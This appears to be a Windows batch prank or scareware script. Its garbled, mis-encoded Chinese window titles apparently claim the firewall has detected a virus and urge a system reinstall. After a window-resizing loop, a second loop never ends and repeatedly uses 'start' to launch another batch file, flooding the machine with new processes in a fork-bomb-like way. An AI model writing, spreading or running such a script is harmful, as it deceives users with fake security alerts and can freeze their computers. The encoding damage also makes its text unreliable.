@echo off 
color 3c
set a=14 
:No1
title=��ʱ���ѿ�����%a%/100     Windowϵͳ����ǽ��⵽��没�����ף���ߣڣ����ϵͳ����������������    
set /a a+=1
mode con cols=%a% lines=1
if %a% lss 100 goto No1 
:No2
title                                                      ��ʾ���뾡����װϵͳ��
set /a a-=1
mode con cols=%a% lines=1
start ��ʱ180���CMD.exe.bat
if %a% lss 100 goto No2










